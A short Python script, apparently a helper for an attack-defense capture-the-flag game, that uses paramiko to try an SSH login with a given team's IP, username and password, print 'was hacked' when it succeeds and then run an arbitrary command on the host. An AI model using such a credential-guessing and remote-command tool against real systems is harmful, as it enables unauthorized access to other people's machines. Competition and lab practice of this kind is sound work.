"""

https://qiita.com/naoya-cheese/items/dc584b0aba16410da133

with paramiko.SSHClient() as ssh:
	ssh.set_missing_host_key_policy(paramiko.WarningPolicy())

"""

import paramiko

def	sshc(team_id, ip, user, passwd, cmd):
	with paramiko.SSHClient() as client:

		HOSTNAME = ip
		USERNAME = user
		PASSWORD = passwd
		LINUX_COMMAND = cmd

		client = paramiko.SSHClient()
		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		try:
			client.connect(
				hostname=HOSTNAME,
				port=22,
				username=USERNAME,
				password=PASSWORD,
				timeout=3,
			)
			print("\033[31mteam",team_id, ip, user + ":" + passwd, "was hacked\033[0m")
			stdin, stdout, stderr = client.exec_command(LINUX_COMMAND)
			for line in stdout:
				print(line, end='')
			return True
		except:
			print(ip, user+":"+passwd, "was not hacked")
			return False
